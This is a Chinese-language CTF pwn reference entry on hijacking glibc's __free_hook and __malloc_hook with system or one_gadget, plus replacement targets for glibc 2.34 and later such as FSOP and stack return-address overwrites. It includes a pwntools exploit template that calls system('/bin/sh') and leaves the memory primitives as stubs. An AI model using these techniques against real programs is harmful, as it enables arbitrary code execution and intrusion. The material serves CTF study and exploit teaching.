---
title: __malloc_hook / __free_hook 与 2.34+ 替代方案
category: pwn
tags: [malloc_hook, free_hook, one_gadget, 2.34, exit_funcs]
signals: [题目 libc 2.23~2.33, 有任意写能力, 需要一次 malloc 或 free 就拿到 shell, 2.34 后 __free_hook 找不到, one_gadget 工具用得贼顺]
difficulty: medium
source: "CTF-Wiki heap hook / ir0nstone One Gadgets / one_gadget"
tools: [one_gadget, pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目 libc 版本 ≤ 2.33，能任意写（堆 / 格式化字符串 / 栈）。
- 想要「少跳一步」：不想布置完整 ROP，只想一次 malloc/free 拿 shell。
- 本地 `libc.sym['__free_hook']` 能取到（2.34 之前），远程也一样。
- 2.34 及以上时，`__free_hook` 取不到（报 `KeyError` 或 `ABSENT`），需要替代方案。
- 题目有 `setbuf` 之后的输出，可走 `_IO_FILE`；或 `main` 正常 `return`，可走 `__exit_funcs`。

## 二、原理

### 2.34 之前的黄金靶点

```c
// glibc < 2.34
void *__libc_malloc(size_t bytes) {
    void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);
    if (__builtin_expect(hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS(0));
    ...
}
void __libc_free(void *mem) {
    void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);
    if (__builtin_expect(hook != NULL, 0)) {
        (*hook)(mem, RETURN_ADDRESS(0));
        return;
    }
    ...
}
```

- 写 `__malloc_hook = one_gadget`：下次任意 `malloc` 触发（参数是 `size`，通常要挑满足约束的 gadget）。
- 写 `__free_hook = system`：下次任意 `free(ptr)` 触发，`ptr` 内容为 `/bin/sh` 即拿 shell。**最稳**。
- 写 `__free_hook = one_gadget`：约束较少时更省事。

### one_gadget 挑选

```bash
one_gadget ./libc.so.6
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0 && rcx == NULL
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints: [rsp+0x40] == NULL
```

用 pwntools 自动挑：

```python
def pick_gadget(libc, avoid=()):
    import subprocess, json, re
    out = subprocess.run(["one_gadget", "--json", libc.path],
                         capture_output=True, text=True).stdout
    for g in json.loads(out):
        cons = " ".join(g.get("constraints", []))
        if any(a in cons for a in avoid):
            continue
        return int(g["offset"], 16)
    return None
```

### 2.34 之后的替代靶点

| 版本 | 靶点 | 触发方式 |
|---|---|---|
| ≥ 2.34 | `_IO_list_all` → 伪造 FILE（FSOP） | `exit()` / `_IO_cleanup` |
| ≥ 2.34 | `_IO_2_1_stdout_` 的 `_IO_write_base/ptr` | 任意读写（信息泄露也行） |
| ≥ 2.34 | `__exit_funcs`（`exit_function_list`） | `exit()` 时遍历调用 |
| ≥ 2.34 | `tls_dtor_list` | `__call_tls_dtors`，线程退出时 |
| ≥ 2.34 | 栈上返回地址（需栈泄露，`environ`） | `leave; ret` |
| ≥ 2.34 | `main_arena` + `_IO_FILE` 链（House of Banana 类） | `exit()` 遍历 |

`__exit_funcs` 结构（glibc 2.34+ 用新的 `PTR_MANGLE` 保护，需先泄露 `pointer_guard`，较麻烦，优先用 FSOP）。

## 三、checksec 判读与利用思路

```text
libc ≤ 2.33  →  优先 __free_hook + system("/bin/sh")
libc 2.34+   →  FSOP / _IO_2_1_stdout_ / 栈（先泄露 environ）
libc 2.40+   →  同上，但注意 _IO_file_jumps 的额外检查
```

决策：

1. **能任意写 8 字节** → 直接 `__free_hook = system`（2.33-）。
2. **只能写有限长度** → `__free_hook = one_gadget`（更省字节）。
3. **只能改 GOT（Partial RELRO）** → 改 `free@got` 为 `system`（注意 libc 版本差异）。
4. **2.34+** → 写 `_IO_2_1_stdout_` 泄露 libc/栈，再用 `__exit_funcs` 或栈 ROP。
5. **有 `environ` 泄露** → 直接改栈返回地址，绕开所有 hook 问题。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()

# ---------- 版本能力判定 ----------
def libc_ver(lc): return tuple(int(x) for x in (lc.version or (0, 0)))
def has(lc, sym): return sym in lc.sym and lc.sym[sym] != 0

# ---------- 2.33 及以下：__free_hook ----------
def hook_free_system(p, free_hook_addr, system_addr, binsh_addr=None, bin_ptr=None):
    """
    free_hook_addr: libc.sym['__free_hook']（已加载 base 后）
    bin_ptr       : 指向 /bin/sh 字符串的 chunk 地址（free 它即可触发）
    """
    write_any(free_hook_addr, p64(system_addr))
    if bin_ptr is None:
        # 提前申请一块写 /bin/sh\x00，再用菜单 free
        bin_ptr = alloc_chunk_with(b"/bin/sh\x00")
    free_chunk(bin_ptr)
    p.interactive()

# ---------- 2.33 及以下：__malloc_hook + one_gadget ----------
def hook_malloc_gadget(one_gadget, malloc_hook_addr, wanted_size=None):
    """one_gadget 的参数是 size，约束常要求特定寄存器；先选无约束的那个"""
    write_any(malloc_hook_addr, p64(one_gadget))
    return trigger_malloc(wanted_size or 0x20)

# ---------- 2.34+：_IO_list_all / exit 触发 ----------
def exit_hijack_stack(frame_addr):
    """
    glibc 2.35 之后 __exit_funcs 受 PTR_MANGLE；更稳的是改栈返回地址。
    步骤：environ 泄露 -> 栈地址 -> 覆盖 main 的返回地址为 ROP
    """
    libc.address = int(args.BASE or "0", 16)
    environ = libc.sym["environ"]
    stack_leak = leak_ptr(environ)                   # 任意读原语
    ret_slot = stack_leak - int(args.OFFSET or "0x120", 16)
    log.info(f"environ={hex(stack_leak)} ret_slot={hex(ret_slot)}")
    rop = ROP(libc)
    rop.raw(p64(rop.ret.address))
    rop.system(next(libc.search(b"/bin/sh\x00")))
    return ret_slot, rop.chain()

# ---------- 占位原语（按题目实现） ----------
def write_any(addr, data): raise NotImplementedError("按题目的任意写原语实现：堆 / fmtstr / UAF")
def leak_ptr(addr, n=8):   raise NotImplementedError("按题目的任意读原语实现")
def alloc_chunk_with(d):   raise NotImplementedError("申请一块并写入 data，返回其 chunk 地址")
def free_chunk(addr):      raise NotImplementedError("按地址释放")
def trigger_malloc(size):  raise NotImplementedError("触发一次 malloc")

# ---------- 代理：按 libc 版本路由 ----------
def exploit(p):
    v = libc_ver(libc)
    info(f"libc version = {libc.version}")
    if v < (2, 34) and has(libc, "__free_hook"):
        success("走 __free_hook 路线")
        hook_free_system(p, libc.sym["__free_hook"], libc.sym["system"])
    else:
        warn("libc >= 2.34，改走 FSOP / 栈")
        exit_hijack_stack(None)

if __name__ == "__main__":
    p = start()
    exploit(p)
```

one_gadget 的约束现场验证（本地试）：

```bash
one_gadget ./libc.so.6 --level 1
# 在 gdb 里打上约束前，先看 rsp 对齐：
gdb -q ./pwn -ex 'b *malloc' -ex 'r' -ex 'p/x $rsp & 0xf' -ex q
```

## 五、常见坑 / 变体

- **2.34 删除了 `__free_hook` / `__malloc_hook`**：Ubuntu 22.04 起默认 2.35，老 writeup 直接失效；`libc.sym.get()` 返回 `None` 不要当作 bug。
- **one_gadget 约束不满足**：`rsp & 0xf == 0` 这类要求可以用「先 `malloc` 一次」或调整调用点满足；`[rsp+0x40] == NULL` 可以用 `calloc` 拿到零页。
- **`__malloc_hook` 需要 size 匹配**：hook 被调用时 `rdi = size`，one_gadget 若依赖 `rdi` 就不要用。
- **`__free_hook` 参数是 ptr**：`ptr` 必须指向 `"/bin/sh"`，否则 `system` 执行的是垃圾字符串。
- **`one_gadget` 有多版本混淆**：libc 版本必须与题目完全一致，否则偏移全错。
- **`_IO_2_1_stdout_` 被 `setvbuf` 影响**：无缓冲时 `stdout` 不走 `_IO_file_xsputn`，FSOP 泄露不生效。
- **`exit` vs `return`**：`exit()` 会走 `_IO_cleanup`；`main` 直接 `return` 也会走 `exit`（CRT），但 `_exit()` 不会。

## 六、参考来源

- [ir0nstone: One Gadgets and Malloc Hook](https://ir0nstone.gitbook.io/notes/binexp/stack/one-gadgets-and-malloc-hook)
- [CTF-Wiki: Heap 相关数据结构与 house 系列](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/)
- [CTF-Wiki: FSOP（2.34+ 替代路线）](https://ctf-wiki.org/pwn/linux/user-mode/io-file/fsop/)
- [glibc 2.31 malloc.c（hook 源码）](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c)
- [glibc 最新 malloc.c（确认 hook 已删）](https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c)
- [HackTricks: Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html)
